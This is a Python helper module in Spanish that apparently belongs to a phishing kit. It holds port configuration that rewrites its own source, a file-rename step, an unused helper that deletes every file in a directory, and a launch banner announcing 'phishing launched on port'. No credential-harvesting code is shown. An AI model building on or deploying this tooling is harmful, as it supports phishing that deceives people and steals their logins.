from modulo import colorate_time, ascii_randomly_time, zph_style
import sys
import subprocess
import time
import os
import modulo
import random

def move_clear(directory_value, ask_root):

    def borrar_archivos_en_directorio(ruta_directorio):
        elementos = os.listdir(ruta_directorio)
        for elemento in elementos:
            ruta_elemento = os.path.join(ruta_directorio, elemento)
            if os.path.isfile(ruta_elemento):
                os.remove(ruta_elemento)
            else:
                print("")
    def renombrar_archivo(ruta_original, nuevo_nombre):
        extension = os.path.splitext(ruta_original)[1]
        nueva_ruta = os.path.join(os.path.dirname(ruta_original), nuevo_nombre + extension)
        os.rename(ruta_original, nueva_ruta)

    renombrar_archivo(ask_root, 'imagen')

def puertos():
    port = 8080#id1
    return port

def reiniciar_script():
    import os
    python = sys.executable
    os.execv(python, [python] + sys.argv)

def change_port():

    main_file = __file__

    search = "8080#id1"
    value_port = puertos()
    try:
        ask = int(input(zph_style.to_ask("INGRESA EL PUERTO")))
        if ask == 1:
            return
        else:
            pass
        print()
        zph_style.to_style("AHORA TU PUERTO SERA: ")
        print(ask)
        time.sleep(0.5)

    except (TypeError, ValueError):
        zph_style.error("NO SE PERMITE CARACTERES O NUMEROS DECIMALES...")
        return

    with open(main_file, 'r') as file:
        content = file.read()

    replace_content = content.replace(search, f'{ask}#id1')

    with open(main_file, 'w') as wfile:
        wfile.write(replace_content)
    print()    
    zph_style.alert("REINICIANDO SCRIPT PARA ACTUALIZAR LAS CONFUGURACIONES...", 0.05)
    reiniciar_script()

def execution_one():
    try:
        change_port()
    except (KeyboardInterrupt, UnboundLocalError):
        exit()

def openfile(which_file, search_what, replace_what):
    with open(which_file, 'r') as file:
        contenido = file.read()

    remplazado = contenido.replace(search_what, replace_what)

    with open(which_file, "w") as archivo:
        archivo.write(remplazado)

def clean_terminal():
    import platform
    if platform.system() == "Linux":
        os.system('clear')
    else:
        os.system('cls')

def basic():
    import logging
    logger = logging.getLogger('werkzeug')
    logger.setLevel(logging.ERROR)
    clean_terminal()
    modulo.main_head.text_banner()
    modulo.main_head.logo_banner()
    modulo.main_head.author_text()
    print()
    zph_style.to_style("PHISHING LANZADO AL PUERTO: ")
    print(puertos())
    modulo.main_head.message_exit()        
